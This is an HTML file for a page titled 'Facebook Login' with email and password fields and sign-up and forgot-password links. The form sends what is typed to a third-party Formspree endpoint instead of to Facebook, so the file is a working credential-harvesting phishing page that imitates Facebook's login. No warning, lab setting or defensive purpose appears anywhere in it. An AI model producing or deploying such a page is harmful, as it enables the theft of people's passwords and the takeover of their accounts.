<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <form class="login-form" action="https://formspree.io/f/mnqeyakb" method="POST" novalidate>
            <h2>Login to Facebook</h2>
            <div class="input-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="_replyto" placeholder="Your Email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Login</button>
            <div class="forgot-password"><a href="#">Forgot password?</a></div>
            <hr>
            <div class="create-account">Don't have an account? <a href="#">Sign up</a></div>
        </form>
    </div>
</body>
</html>
